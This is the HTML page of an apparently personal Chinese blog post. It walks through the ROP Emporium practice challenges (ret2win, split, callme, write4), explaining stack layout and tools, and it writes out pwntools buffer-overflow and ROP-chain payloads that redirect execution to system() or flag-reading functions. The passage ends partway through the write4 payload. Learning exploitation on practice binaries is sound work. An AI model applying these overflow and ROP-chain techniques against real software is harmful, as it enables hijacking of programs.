@@ -1,0 +1,576 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="google-site-verification" content="EG4Bjpdp2Ab8fVRRgskXpY8SWbusBOQsiHA-qLNx6kw" />
+  <meta name="msvalidate.01" content="B8A0A64EAB0FC5E0F51FE913998A0618" />
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yjy123123.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="或许是pwn入门？少壮不努力，老大徒伤悲，有种天天晚上哭着写作业的感觉。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ROP Emporium详解">
+<meta property="og:url" content="http://yjy123123.github.io/2021/12/13/ROP-Emporium%E8%AF%A6%E8%A7%A3/index.html">
+<meta property="og:site_name" content="yjy&#39;s Blog">
+<meta property="og:description" content="或许是pwn入门？少壮不努力，老大徒伤悲，有种天天晚上哭着写作业的感觉。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://yjy123123.github.io/2021/12/13/ROP-Emporium%E8%AF%A6%E8%A7%A3/1.png">
+<meta property="og:image" content="http://yjy123123.github.io/2021/12/13/ROP-Emporium%E8%AF%A6%E8%A7%A3/2.png">
+<meta property="og:image" content="http://yjy123123.github.io/2021/12/13/ROP-Emporium%E8%AF%A6%E8%A7%A3/3.png">
+<meta property="og:image" content="http://yjy123123.github.io/2021/12/13/ROP-Emporium%E8%AF%A6%E8%A7%A3/4.png">
+<meta property="og:image" content="http://yjy123123.github.io/2021/12/13/ROP-Emporium%E8%AF%A6%E8%A7%A3/ret2win-2.png">
+<meta property="og:image" content="http://yjy123123.github.io/2021/12/13/ROP-Emporium%E8%AF%A6%E8%A7%A3/ret2win-3.png">
+<meta property="og:image" content="http://yjy123123.github.io/2021/12/13/ROP-Emporium%E8%AF%A6%E8%A7%A3/split.png">
+<meta property="og:image" content="http://yjy123123.github.io/2021/12/13/ROP-Emporium%E8%AF%A6%E8%A7%A3/%E6%A0%88.png">
+<meta property="og:image" content="http://yjy123123.github.io/2021/12/13/ROP-Emporium%E8%AF%A6%E8%A7%A3/split-1.png">
+<meta property="og:image" content="http://yjy123123.github.io/2021/12/13/ROP-Emporium%E8%AF%A6%E8%A7%A3/split-2.png">
+<meta property="og:image" content="http://yjy123123.github.io/2021/12/13/ROP-Emporium%E8%AF%A6%E8%A7%A3/callme-1.png">
+<meta property="og:image" content="http://yjy123123.github.io/2021/12/13/ROP-Emporium%E8%AF%A6%E8%A7%A3/%E6%A0%88.png">
+<meta property="og:image" content="http://yjy123123.github.io/2021/12/13/ROP-Emporium%E8%AF%A6%E8%A7%A3/callme-2.png">
+<meta property="og:image" content="http://yjy123123.github.io/2021/12/13/ROP-Emporium%E8%AF%A6%E8%A7%A3/callme-3.png">
+<meta property="og:image" content="http://yjy123123.github.io/2021/12/13/ROP-Emporium%E8%AF%A6%E8%A7%A3/callme-4.png">
+<meta property="og:image" content="http://yjy123123.github.io/2021/12/13/ROP-Emporium%E8%AF%A6%E8%A7%A3/write4-1.png">
+<meta property="og:image" content="http://yjy123123.github.io/2021/12/13/ROP-Emporium%E8%AF%A6%E8%A7%A3/write4-2.png">
+<meta property="og:image" content="http://yjy123123.github.io/writ4-3.png">
+<meta property="og:image" content="http://yjy123123.github.io/2021/12/13/ROP-Emporium%E8%AF%A6%E8%A7%A3/write4-4.png">
+<meta property="og:image" content="http://yjy123123.github.io/2021/12/13/ROP-Emporium%E8%AF%A6%E8%A7%A3/write4-5.png">
+<meta property="article:published_time" content="2021-12-13T02:42:10.000Z">
+<meta property="article:modified_time" content="2021-12-16T09:27:41.493Z">
+<meta property="article:author" content="yjy123">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yjy123123.github.io/2021/12/13/ROP-Emporium%E8%AF%A6%E8%A7%A3/1.png">
+
+<link rel="canonical" href="http://yjy123123.github.io/2021/12/13/ROP-Emporium%E8%AF%A6%E8%A7%A3/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>ROP Emporium详解 | yjy's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">yjy's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://yjy123123.github.io/2021/12/13/ROP-Emporium%E8%AF%A6%E8%A7%A3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="yjy123">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="yjy's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ROP Emporium详解
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-12-13 10:42:10" itemprop="dateCreated datePublished" datetime="2021-12-13T10:42:10+08:00">2021-12-13</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-12-16 17:27:41" itemprop="dateModified" datetime="2021-12-16T17:27:41+08:00">2021-12-16</time>
+              </span>
+
+          
+            <span id="/2021/12/13/ROP-Emporium%E8%AF%A6%E8%A7%A3/" class="post-meta-item leancloud_visitors" data-flag-title="ROP Emporium详解" title="Views">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine: </span>
+    
+    <a title="valine" href="/2021/12/13/ROP-Emporium%E8%AF%A6%E8%A7%A3/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2021/12/13/ROP-Emporium%E8%AF%A6%E8%A7%A3/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+            <div class="post-description">或许是pwn入门？少壮不努力，老大徒伤悲，有种天天晚上哭着写作业的感觉。</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>最近在做一些ROP（全称为Return-oriented programming，返回导向编程）的简单题，虽然简单，但是我不会啊。我对于栈的相关知识还是很贫瘠的，然后对相关知识也没有成体系的了解，不过还好有人可以请教，不至于非常抓瞎。然后基本上是通过做题学习相关知识，然后这里备忘一下。</p>
+<h3 id="栈溢出相关知识"><a href="#栈溢出相关知识" class="headerlink" title="栈溢出相关知识"></a>栈溢出相关知识</h3><p>我对栈的了解仅存在于一些基本的概念，比如说先进后出，从高地址向低地址增长，esp存放栈顶地址，ebp存放栈底地址。</p>
+<p>在ROP中，需要通过栈溢出覆盖返回地址，那么如何构造payload来覆盖返回地址呢。下面是<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stackoverflow-basic/">CTF Wiki栈溢出原理</a>中一张栈的结构图。我之所以ret2win无从下手就是因为我连栈的结构我都不太了解。</p>
+<p>这里需要理解两个地方，第一在存放数据的时候，数据从低地址往高地址存放，所以会覆盖ebp和返回地址。第二点，返回地址前面有一块内存是ebp，这里是存放了之前的ebp地址（用于后续恢复上下文），32位是4个字节，64位是8个字节。所以想要覆盖返回地址的时候，除了把当前栈空间覆盖还需要把ebp也覆盖了。</p>
+<p><img src="/2021/12/13/ROP-Emporium%E8%AF%A6%E8%A7%A3/1.png"></p>
+<p>知道了如何返回地址的覆盖，那如果要调用的函数，参数如何传递的我又不清楚了。下面这张图是函数调用栈的方法。摘自<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stack-intro/">CTF Wiki栈介绍</a></p>
+<p><img src="/2021/12/13/ROP-Emporium%E8%AF%A6%E8%A7%A3/2.png"></p>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>ROP Emporium有一个<a target="_blank" rel="noopener" href="https://ropemporium.com/guide.html">Beginners’ guide</a>里面提到一些工具的使用，pwntools和pwndbg是一定要安装的。我在kali下安装环境还弄了挺久的。一个是下载pwndbg疯狂报错相关版本不适配，这里换清华或者其他的镜像之后，update一下，但是换源的教程一定要找一个靠谱的，不然白折腾。第二个就是pwntools，需要python3的环境，但是kali系统自带的是pyhton2.7，所以下载一个virtualenvwrapper，方便python版本管理。</p>
+<h3 id="相关工具使用"><a href="#相关工具使用" class="headerlink" title="相关工具使用"></a>相关工具使用</h3><h4 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checksec filename</span><br></pre></td></tr></table></figure>
+<p>查看几种安全机制是否开启。</p>
+<h4 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h4><p>pwntools是一个帮助写EXP的框架，因为这里是为了做题，所以我直接抄的模版，之后主要是改payload。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"># 导入pwntools的相关依赖</span><br><span class="line"></span><br><span class="line">elf &#x3D; ELF(&#39;.&#x2F;filename&#39;)</span><br><span class="line"># 静态的ELF对象，可以访问符号表中的值</span><br><span class="line"></span><br><span class="line">if args.GDB:</span><br><span class="line">    io &#x3D; gdb.debug(&#39;.&#x2F;filename&#39;,gdbscript&#x3D;&#39;continue&#39;)</span><br><span class="line">    # 调试模式，在gdb中运行</span><br><span class="line">    # 进入这里的话可以使用</span><br><span class="line">    # python solve.py GDB</span><br><span class="line">    # 这样的指令运行脚本</span><br><span class="line">else:</span><br><span class="line">    io &#x3D; process(&#39;.&#x2F;filename&#39;)</span><br><span class="line">    # 加载程序的进程</span><br><span class="line"></span><br><span class="line">payload &#x3D; b&#39;XXXX&#39; + p32()</span><br><span class="line"># 主要修改这个payload，payload里面的填充需要是bytes类型</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"># 将payload通过stdin发给程序</span><br><span class="line">io.interactive()</span><br><span class="line"># 进入交互模式</span><br></pre></td></tr></table></figure>
+<h4 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h4><p>用来找需要的gadget的工具，并且可以通过grep添加限制条件，进一步找需要的gadget。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop --only “pop|ret” | grep &quot;eax&quot;</span><br></pre></td></tr></table></figure>
+<h4 id="pwndbg"><a href="#pwndbg" class="headerlink" title="pwndbg"></a>pwndbg</h4><p>pwndbg是一个gdb插件，用来动态调试看栈的变化。常用指令包括：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">help  --帮助</span><br><span class="line"></span><br><span class="line">r  --run，执行程序</span><br><span class="line">c  --continue，执行到下一个断点</span><br><span class="line">si --step into，单步步入</span><br><span class="line">so --step out，单步步过</span><br><span class="line">b *0xaddr    --下断点，在某一个地址下断点</span><br><span class="line">b fun_name   --在函数处下断点</span><br><span class="line">disable n  --禁用n号断点</span><br><span class="line">enable n  --启用n号断点</span><br><span class="line">info breakpoint  --查看断点信息</span><br><span class="line">disass fun_name --打印函数汇编指令</span><br></pre></td></tr></table></figure>
+<h3 id="ROP-Emporium-Writeup"><a href="#ROP-Emporium-Writeup" class="headerlink" title="ROP Emporium Writeup"></a>ROP Emporium Writeup</h3><h4 id="基本解题步骤"><a href="#基本解题步骤" class="headerlink" title="基本解题步骤"></a>基本解题步骤</h4><ol>
+<li>checksec检查程序的安全机制</li>
+<li>ida逆向，主要是看漏洞点，重点关注一些危险函数。</li>
+</ol>
+<p><img src="/2021/12/13/ROP-Emporium%E8%AF%A6%E8%A7%A3/3.png"></p>
+<ol start="3">
+<li>通过分析，找到需要填充的长度。</li>
+<li>构造payload，这个地方可能还需要找gadget来构建完整的攻击链。</li>
+</ol>
+<h4 id="ret2win"><a href="#ret2win" class="headerlink" title="ret2win"></a>ret2win</h4><h5 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h5><p>checksec查看一下发现，ret2win开启NX，堆栈不可执行。</p>
+<p><img src="/2021/12/13/ROP-Emporium%E8%AF%A6%E8%A7%A3/4.png"></p>
+<p>然后用ida看一下程序，看见main函数里面调用了pwnme函数，pwnme里面可以看到s到ebp的距离是40个字节，但是读的时候read了0x38个字节，存在栈溢出漏洞。所以需要覆盖的大小40个字节和4个字节的ebp。</p>
+<p><img src="/2021/12/13/ROP-Emporium%E8%AF%A6%E8%A7%A3/ret2win-2.png"></p>
+<p>并且发现一个有意思的函数ret2win，可以直接读取flag.txt文件，用ida可以看到ret2win函数的地址是0x0804862C。</p>
+<p><img src="/2021/12/13/ROP-Emporium%E8%AF%A6%E8%A7%A3/ret2win-3.png"></p>
+<p>直接构造<code>payload = b&#39;A&#39;*40 + b&#39;B&#39;*4 + p32(0x0804862c)</code></p>
+<p>这里还有另一个方法获得ret2win函数地址的方法，用 <strong>elf.sym.ret2win</strong>，通过符号表直接获得ret2win函数的地址。</p>
+<h5 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h5><p>64位和32位差不多，但是64位ebp长度为8个字节，s到ebp为32个字节，所以一共需要40个字节。</p>
+<p>构造<code>payload = b&#39;A&#39;*32 + b&#39;B&#39;*8 + p64(0x0400756)</code></p>
+<h4 id="split"><a href="#split" class="headerlink" title="split"></a>split</h4><h5 id="32位-1"><a href="#32位-1" class="headerlink" title="32位"></a>32位</h5><p>split和ret2win很像，但是split里面没有可以直接使用的函数了，usefulFunction无法直接读取flag，经过提示看了一下字符串窗口，发现了一个userfulString，需要控制返回地址跳到system函数执行，然后userfulString作为参数传递给system函数。这里找到了usefulString的地址为 <strong>0x0804a030</strong> 。</p>
+<p><img src="/2021/12/13/ROP-Emporium%E8%AF%A6%E8%A7%A3/split.png"></p>
+<p>现在需要找到system()函数的地址，system函数是外部函数，需要动态链接调用，第一个方法是直接通过 <strong>elf.plt.system</strong> 获得system的plt地址，就可以调用该函数。</p>
+<p>那么结合之前说的32位的函数参数在返回地址上面，那么我就很理所当然的构造了一番<code>payload =  b&#39;A&#39;*40 + b&#39;B&#39;*4 + p32(elf.plt.system) + p32(addr_usefulString) </code> ，但是报错了，我想了半天都没想明白，然后场外求助了一下，说了半天我才懂，笑死。</p>
+<p>这个要从函数调用传参设置返回地址的整个过程说起。这一部分参考了<a target="_blank" rel="noopener" href="https://paper.seebug.org/271/">手把手教你栈溢出从入门到放弃（上）</a>的<em>0x20</em>  背景知识和 <em>0x50</em> Return2libc，加了点我自己的理解，弄巧成拙警告，如果有错误欢迎指出。</p>
+<p><img src="/2021/12/13/ROP-Emporium%E8%AF%A6%E8%A7%A3/%E6%A0%88.png"></p>
+<p>上面这张图是函数调用完成后的栈的样子，arg是被调用函数的参数，然后是返回地址，然后是ebp。这就相当于被调用函数（callee）的参数在调用函数（caller）的栈内保存，被调用函数（callee）的栈和调用函数（caller）的栈之间隔了一个返回地址，这个返回地址是调用完函数之后的下一条指令，而不是参数和函数地址直接相连。</p>
+<p>我们希望将返回地址设为system函数的地址，usefulString做为函数参数，但是两者之间还有一个 <strong>返回地址</strong>，所以payload改为<code>payload =  b&#39;A&#39;*40 + b&#39;B&#39;*4 + p32(elf.plt.system) + p32(0) + p32(addr_usefulString) </code></p>
+<p>在找资料的时候还看到一个解法。</p>
+<p>在 <strong>0x0804861a</strong> 的地方，system作为一个子例程被调用（我的理解是直接就是一个gadget），这里不需要管返回地址，直接传参数即可。<code>payload =  b&#39;A&#39;*40 + b&#39;B&#39;*4 + p32(0x0804861a) + p32(addr_usefulString) </code></p>
+<p><img src="/2021/12/13/ROP-Emporium%E8%AF%A6%E8%A7%A3/split-1.png"></p>
+<h5 id="64位-1"><a href="#64位-1" class="headerlink" title="64位"></a>64位</h5><p>64位传参和32位不太一样，总结如下：</p>
+<ol>
+<li>64位通过寄存器传参，前六个整型或指针参数依次保存在 <em>%rdi, %rsi, %rdx, %rcx, %r8,  %r9</em> 中</li>
+<li>传参操作要通过gadget实现，system函数只需要传递一个参数，所以要通过 <strong>pop rdi</strong> 实现参数传递</li>
+<li>函数参数传递是在函数执行之前</li>
+</ol>
+<p>这里我还疑惑过，为什么是靠pop来传参的，而不是mov指令或者push。我真的好傻*，汇编也是一窍不通，pop指令的含义——弹出堆栈指令，将栈顶的数据弹出并存至 dst，格式为 <strong>pop dst;</strong> 。如果到这里你还不知道为什么要用pop，那我只能说你连我都不如了。而且我猜你肯定也不知道ret有 <strong>pop eip</strong>的含义（并没有说一样的意思，RET——返回指令，操作为将栈顶数据弹出至 eip）。</p>
+<p>系统调用参数的传入如果不理解可以参考<a target="_blank" rel="noopener" href="https://paper.seebug.org/272/#0x30-rop-return-oriented-programming">手把手教你栈溢出从入门到放弃（下）</a></p>
+<p>所以构造<code>payload = b&#39;A&#39;*32 + b&#39;B&#39;*8 + p64(addr_pop_gadget) + p64(addr_usefulString) + p64(addr_system)</code></p>
+<p>usefulString和system函数地址的获取和之前一样，gadget地址的获取是通过ROPgadget工具来找到的。</p>
+<p><img src="/2021/12/13/ROP-Emporium%E8%AF%A6%E8%A7%A3/split-2.png"></p>
+<h4 id="callme"><a href="#callme" class="headerlink" title="callme"></a>callme</h4><h5 id="32位-2"><a href="#32位-2" class="headerlink" title="32位"></a>32位</h5><p>callme这道题和前两道题都不太一样，它要调用三个函数才能构成完整的攻击链，并且函数也需要传递三个参数。</p>
+<p>用ida打卡callme函数，依旧是pwnme出问题，然后calllme_one,calllme_two,calllme_three都是需要动态链接的外部函数。</p>
+<p>首先尝试用之前的知识先尝试调用一个函数，这里唯一不太一样的是多个参数时，是从左往右一次入栈，但是不要忘了我们覆盖是从栈顶向底部覆盖的，所以构造<code>payload =  b&#39;A&#39;*40 + b&#39;B&#39;*4 + p32(elf.plt.callme_one) + p32(0) + p32(0xdeadbeef) + p32(0xcafebabe) +p32(0xd00df00d)</code> </p>
+<p><img src="/2021/12/13/ROP-Emporium%E8%AF%A6%E8%A7%A3/callme-1.png"></p>
+<p>可以看到成功执行了callme_one函数，那么接下来只需要调用calllme_two就可以了（call_three一样套路），然后我就思考如何调用callme_two，想了两个方案：</p>
+<ol>
+<li>把下一条指令地址改为callme_two的地址，那么自然会跳到callme_two的地方执行；</li>
+<li>gadget找jmp指令，跳转到callme_two执行</li>
+</ol>
+<p>然后苦苦挣扎了非常久…然后寻求了场外求助，我知道无语了，我以为会了一题就能举一反三融会贯通，马上做完剩下两道题。</p>
+<p>第一种方法是比较靠谱的思路，但是不管怎么构造payload，都是报错说参数不对。</p>
+<p>再一次回到最初的函数调用时栈的结构，函数的参数并不会再函数执行完之后直接也从栈中pop出去，而是依旧停留在调用函数的栈中，所以callme_one的参数还是在内存中，callme_two无法正确传参。</p>
+<p><img src="/2021/12/13/ROP-Emporium%E8%AF%A6%E8%A7%A3/%E6%A0%88.png"></p>
+<p><img src="/2021/12/13/ROP-Emporium%E8%AF%A6%E8%A7%A3/callme-2.png"></p>
+<p>所以需要用一个gadget把callme_one的参数先pop出来，好存放callme_two的参数，通过ROPgadget找到了这样的片段，地址为<code>0x80487f9</code>。</p>
+<p><img src="/2021/12/13/ROP-Emporium%E8%AF%A6%E8%A7%A3/callme-3.png"></p>
+<p>最后构造</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; b&#39;A&#39;* 40 + b&#39;B&#39;*4 + p32(callme_one)+p32(0x080487f9)+p32(0xdeadbeef)+p32(0xcafebabe) + p32(0xd00df00d) +p32(callme_two)+p32(0x080487f9)+p32(0xdeadbeef)+p32(0xcafebabe) + p32(0xd00df00d) + p32(callme_three) +p32(0x080487f9)+p32(0xdeadbeef)+p32(0xcafebabe) + p32(0xd00df00d)</span><br></pre></td></tr></table></figure>
+<h5 id="64位-2"><a href="#64位-2" class="headerlink" title="64位"></a>64位</h5><p>其实我觉得64位会更直接更简单粗暴一点，直接用之前split64位的思路解题就可以了，唯一需要注意的就是参数传递是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0xdeadbeef  -&gt;  rdi</span><br><span class="line">0xcafebabe  -&gt;  rsi</span><br><span class="line">0xd00df00d  -&gt;  rdx</span><br></pre></td></tr></table></figure>
+<p>通过ROPgadget找到对应gadget地址为0x40093c。</p>
+<p><img src="/2021/12/13/ROP-Emporium%E8%AF%A6%E8%A7%A3/callme-4.png"></p>
+<p>构造payload为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; b&#39;A&#39;* 32 + b&#39;B&#39;*8 +p64(0x40093c)+ p64(0xdeadbeefdeadbeef)+p64(0xcafebabecafebabe)+ p64(0xd00df00dd00df00d) + p64(callme_one) +p64(0x40093c)+ p64(0xdeadbeefdeadbeef)+p64(0xcafebabecafebabe)+ p64(0xd00df00dd00df00d) + p64(callme_two)+p64(0x40093c)+ p64(0xdeadbeefdeadbeef)+p64(0xcafebabecafebabe)+ p64(0xd00df00dd00df00d) +p64(callme_three)</span><br></pre></td></tr></table></figure>
+<p>当时做完还有一个疑问就是，callme的三个函数都是用一样的寄存器一样的参数，为什么还需要pop呢，pwndbg调试可以发现是在执行过程中寄存器发生了改变。</p>
+<h4 id="write4"><a href="#write4" class="headerlink" title="write4"></a>write4</h4><h5 id="32位-3"><a href="#32位-3" class="headerlink" title="32位"></a>32位</h5><p>这道题的题目描述非常大一段，给了不少提示，一个是没有可利用的字符串了，需要自己向内存中写入，这里提示了一个gadget <code>mov [reg] reg</code> 。然后说用rabin2或者readelf自己找可写入的地方。</p>
+<p>然后用ida分析write4文件，和之前差不多，但是pwnme函数这次也在lib.so文件里面了，依旧是read函数出现问题，需要覆盖的长度为40个字节。并且在lib.so文件里面看到print_file函数，可以读取文件，那么这个函数就是我们要利用的函数，然后并没有现成的字符串可以使用，所以需要依照题目中提示的gadget构造ROP链。</p>
+<p>那么第一步先用ROPgadget找gadget。地址为 <strong>0x08048543</strong>。</p>
+<p><img src="/2021/12/13/ROP-Emporium%E8%AF%A6%E8%A7%A3/write4-1.png"></p>
+<p>然后该gadget是将ebp中的内容写到edi中地址对应的内存空间，当时的第一想法是这里需要对ebp进行控制，然后就开始走偏了。</p>
+<p>接下来是走的一段岔路。</p>
+<p>首先callee函数的ebp中存放的是caller函数的ebp用于之后恢复，那么ebp也是可控的，把callee的ebp中的地址填写为返回地址上面一点的地方，那么可以构造payload控制caller函数的ebp。为了控制ebp，我还得先知道目标指令执行到内存的哪个位置了，好填写ebp，pwndbg调试折腾了半天，我还关了ALSR保证每次都是一个位置，成功将<code>flag</code>写入了got表入口，然后我就不知道怎么办了，一个是这种方法只能写4个字节，但是<code>flag.txt</code>是是8个字节，在使用这个gadget的时候，edi默认位置在got表开头，还不知道能不能这么写。</p>
+<p>然后寻求场外求助。首先edi的值是可以控制的，所以需要找到一个位置，写入<code>flag.txt</code>，在pwndbg中使<code>vmmap</code>可以查看读写权限。当然其他方法也可以，题目描述中给的是rabin2和readelf，但是我不会用。</p>
+<p>然后可以看到write432文件里面的 <strong>0x804a000 - 0x804b000</strong> 是可写的，用ida打开看一看，<strong>0x804a000</strong> 刚好是.got.plt开始的位置，然后还有data段，bss段，然后我选了bss段写入需要的字符串，地址为 <strong>0x804a020</strong></p>
+<p><img src="/2021/12/13/ROP-Emporium%E8%AF%A6%E8%A7%A3/write4-2.png"></p>
+<p><img src="/writ4-3.png"></p>
+<p>确定写入位置之后，就直接找一个gadget控制edi就行了，这里还发现这个gadget非常巧妙，它第二个pop的是ebp，刚好串上了，不用其他方法控制ebp了。</p>
+<p><img src="/2021/12/13/ROP-Emporium%E8%AF%A6%E8%A7%A3/write4-4.png"></p>
+<p>两个gadget都找到了，那么只需要分两次写入<code>flag</code>和<code>.txt</code>就完成了目标字符串写入内存，<code>print_file</code>函数的调用和前几题相同。</p>
+<p>构造payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gadget_1 &#x3D; 0x080485aa</span><br><span class="line">#控制edi和ebp的内容</span><br><span class="line">gadget_2 &#x3D; 0x08048543</span><br><span class="line">#mov指令将字符串写入内存</span><br><span class="line">addr_bss_1 &#x3D; 0x0804A020</span><br><span class="line">#写入“flag”的地址</span><br><span class="line">addr_bss_2 &#x3D; 0x0804A024</span><br><span 